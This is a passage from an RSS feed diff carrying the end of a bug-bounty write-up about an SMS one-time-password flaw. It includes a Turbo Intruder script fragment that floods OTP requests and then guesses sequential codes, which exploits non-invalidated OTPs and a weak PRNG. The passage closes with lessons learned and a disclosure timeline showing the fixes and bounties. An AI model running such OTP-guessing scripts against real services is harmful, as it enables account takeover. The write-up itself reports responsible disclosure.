+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> requestsPerConnection=100,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pipeline=False
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> )
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> code = 7000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> for i in range(50):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> engine.queue(send_sms)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> time.sleep(2.0)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> for k in range(3):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> engine.queue(target.req, str(code))
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> code += 1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">def handleResponse(req, interesting):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> if req.status != 404:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> table.add(req)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The PoC worked 5 out of 5 times, which led to a conclusion that they might be using a non-cryptographically secure PRNG. It was just an educated guess, but later, the company confirmed that their provider used a non-cryptographically secure PRNG.&lt;/p>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>Apart from basic takeaways such as checking for not invalidated OTPs or brainstorming and checking ideas, the following stood out for me:&lt;/p>
+&lt;ul>
+&lt;li>Block time somewhere in the future to verify fixes and find bypasses, even if the fix was confirmed&lt;/li>
+&lt;li>Try to &amp;ldquo;reverse engineer&amp;rdquo; the logic behind it and write it in code more often. I found it to be helpful to brainstorm further ideas.&lt;/li>
+&lt;li>Don&amp;rsquo;t forget about non-cryptographically secure PRNGs and check them more often. (distribution fitting, etc.)&lt;/li>
+&lt;/ul>
+&lt;h2 id="timeline">Timeline
+&lt;/h2>&lt;ul>
+&lt;li>Overall, less than 12 hours of work were spent on this issue, including reporting and communication with the team.&lt;/li>
+&lt;li>11.11.2024 - First issue reported&lt;/li>
+&lt;li>11.11.2024 - First issue fixed&lt;/li>
+&lt;li>11.11.2024 - Fix verified&lt;/li>
+&lt;li>22.11.2024 - ~11000$ bounty paid&lt;/li>
+&lt;li>29.11.2024 - Second issue reported&lt;/li>
+&lt;li>03.12.2024 - OTP Invalidation issue fixed&lt;/li>
+&lt;li>17.12.2024 - PRNG issue fixed&lt;/li>
+&lt;li>16.01.2025 - Fix confirmed&lt;/li>
+&lt;li>23.01.2025 - ~5500$ bounty paid&lt;/li>
+&lt;/ul></description></item></channel></rss>
